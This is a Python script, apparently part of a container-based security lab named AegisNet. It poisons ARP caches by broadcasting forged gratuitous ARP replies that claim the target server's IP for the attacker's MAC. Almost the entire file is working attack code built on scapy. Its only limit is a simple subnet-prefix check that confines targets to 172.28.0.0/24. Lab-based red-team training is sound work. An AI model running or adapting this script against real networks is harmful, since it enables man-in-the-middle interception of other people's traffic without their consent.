"""
attacks/arp_spoof.py
--------------------
ARP Poisoning / MITM Attack Script.

Transmits unsolicited gratuitous ARP replies that bind the target-server's
IP address (172.28.0.20) to the red-attacker's MAC address, poisoning the
ARP cache of any host that receives the broadcast.

SAFETY RULE: This script may ONLY run inside containers on 172.28.0.0/24
(as defined in docker-compose.yml). It must never target addresses outside
that subnet.

Usage (via docker exec):
    python3 /attacks/arp_spoof.py [--target-ip 172.28.0.20] [--count 5]
"""

import argparse
import logging
import sys
import time
from typing import Optional

from scapy.all import ARP, Ether, sendp, get_if_hwaddr

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [ARP-SPOOF] %(message)s",
)
logger = logging.getLogger(__name__)

# ── Safety constants ──────────────────────────────────────────────────────────
ALLOWED_SUBNET = "172.28.0."
IFACE = "eth0"


def _validate_target(ip: str) -> None:
    """Abort if the target IP is outside the lab subnet."""
    if not ip.startswith(ALLOWED_SUBNET):
        logger.error(
            "SAFETY ABORT: Target IP %s is outside the lab subnet %s0/24",
            ip,
            ALLOWED_SUBNET,
        )
        sys.exit(1)


def craft_gratuitous_arp(
    spoofed_ip: str,
    attacker_mac: str,
    target_mac: str = "ff:ff:ff:ff:ff:ff",
) -> Ether:
    """
    Build a gratuitous ARP reply frame.

    The frame claims that `spoofed_ip` is owned by `attacker_mac`, which
    causes receiving hosts to update their ARP tables accordingly.
    """
    return Ether(dst=target_mac, src=attacker_mac) / ARP(
        op=2,           # op=2 → ARP reply (is-at)
        hwsrc=attacker_mac,
        psrc=spoofed_ip,
        hwdst=target_mac,
        pdst=spoofed_ip,
    )


def run_arp_spoof(
    target_ip: str,
    iface: str,
    count: int,
    interval: float,
) -> None:
    """
    Transmit `count` gratuitous ARP replies on `iface`.

    Parameters
    ----------
    target_ip:
        The IP address to spoof (must be within 172.28.0.0/24).
    iface:
        Network interface to use (default: eth0).
    count:
        Number of ARP replies to send.
    interval:
        Seconds between successive packets.
    """
    _validate_target(target_ip)

    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception as exc:
        logger.error("Cannot read MAC from interface %s: %s", iface, exc)
        sys.exit(1)

    logger.info(
        "Starting ARP poison: spoofing IP=%s with MAC=%s on iface=%s",
        target_ip,
        attacker_mac,
        iface,
    )

    frame = craft_gratuitous_arp(spoofed_ip=target_ip, attacker_mac=attacker_mac)

    for i in range(count):
        sendp(frame, iface=iface, verbose=False)
        logger.info(
            "Sent gratuitous ARP reply %d/%d: %s IS-AT %s",
            i + 1,
            count,
            target_ip,
            attacker_mac,
        )
        if i < count - 1:
            time.sleep(interval)

    logger.info("ARP poisoning complete — %d frames sent", count)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="AegisNet ARP Poisoning attack script (lab-only)"
    )
    parser.add_argument(
        "--target-ip",
        default="172.28.0.20",
        help="IP address to spoof (default: 172.28.0.20 = target-server)",
    )
    parser.add_argument(
        "--iface",
        default=IFACE,
        help="Network interface to send from (default: eth0)",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of gratuitous ARP replies to send (default: 5)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.5,
        help="Seconds between ARP packets (default: 0.5)",
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    run_arp_spoof(
        target_ip=args.target_ip,
        iface=args.iface,
        count=args.count,
        interval=args.interval,
    )
